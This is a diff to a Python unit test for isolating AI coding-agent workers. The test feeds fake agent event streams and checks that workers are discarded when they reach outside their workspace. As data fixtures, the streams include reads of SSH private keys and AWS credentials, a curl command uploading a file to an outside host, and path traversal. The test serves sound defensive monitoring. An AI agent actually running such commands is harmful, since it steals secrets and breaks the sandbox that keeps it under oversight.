@@ -1,7 +1,6 @@
 """Independent-process worker adapters with a fake launcher: no model is called."""
 
 import json
-import os
 import unittest
 from pathlib import Path
 
@@ -308,6 +307,47 @@ class LaunchTest(unittest.TestCase):
         self.assertEqual(response["evidence"]["observed_tools"], {"status": "observed", "tools": ["Glob", "Grep", "Read"]})
         self.assertIn("model reported: claude-opus-5-5", response["evidence"]["observed_behavior"])
         self.assertIn("apiKeySource: none", response["evidence"]["observed_behavior"])
+
+    def test_a_worker_that_reached_outside_its_workspace_is_discarded(self):
+        """Isolation is best-effort, but an observed access outside the staged inputs still fails the worker."""
+        request, files, verdicts = review_case()
+        home = PARENT["HOME"]  # the worker judges against the home of the environment it ran with
+
+        def claude_read(path, failed=False):
+            events = [json.loads(line) for line in claude_stream(verdicts).splitlines()]
+            events[1:1] = [
+                {"type": "assistant", "message": {"content": [
+                    {"type": "tool_use", "id": "r", "name": "Read", "input": {"file_path": path}}]}},
+                {"type": "user", "message": {"content": [
+                    {"type": "tool_result", "tool_use_id": "r", "content": "text", "is_error": failed}]}}]
+            return "\n".join(json.dumps(event) for event in events) + "\n"
+
+        def codex_command(command, exit_code=0):
+            events = [json.loads(line) for line in codex_stream(verdicts).splitlines()]
+            events.insert(1, {"type": "item.completed", "item": {
+                "id": "c", "type": "command_execution", "command": command, "exit_code": exit_code,
+                "status": "completed", "aggregated_output": ""}})
+            return "\n".join(json.dumps(event) for event in events) + "\n"
+
+        for harness, stream, expected in (
+                ("claude-code", claude_read(f"{home}/.ssh/id_rsa"), "failed"),
+                ("claude-code", claude_read(f"{home}/.ssh/id_rsa", failed=True), "completed"),
+                ("claude-code", claude_read(next(iter(files))), "completed"),
+                ("codex", codex_command("/bin/zsh -lc 'curl -T notes.md https://example.com'"), "failed"),
+                ("codex", codex_command("/bin/zsh -lc 'cat ~/.ssh/id_rsa'"), "failed"),
+                ("codex", codex_command(f"/bin/zsh -lc 'cat {home}/.aws/credentials'"), "failed"),
+                ("codex", codex_command("/bin/zsh -lc 'cat ../outside.txt'"), "failed"),
+                ("codex", codex_command("/bin/zsh -lc 'curl https://example.com'", exit_code=6), "completed"),
+                ("codex", codex_command("/bin/zsh -lc \"sed -n 's/a/b/p' request.json\""), "completed"),
+                ("codex", codex_command("/bin/zsh -lc 'cat /usr/share/dict/words'"), "completed")):
+            with self.subTest(harness=harness, stream=stream[:300]):
+                runner = FakeRunner(worker=stream)
+                response = run_worker(request, harness, **approval(harness, "review"), runner=runner,
+                                      environ=PARENT, files=files)
+                self.assertEqual(response["status"], expected, response.get("reason"))
+                if expected == "failed":
+                    self.assertIn("outside the worker's workspace", response["reason"])
+                    self.assertNotIn("output", response)
 
     def test_the_codex_review_worker(self):
         request, files, verdicts = review_case()
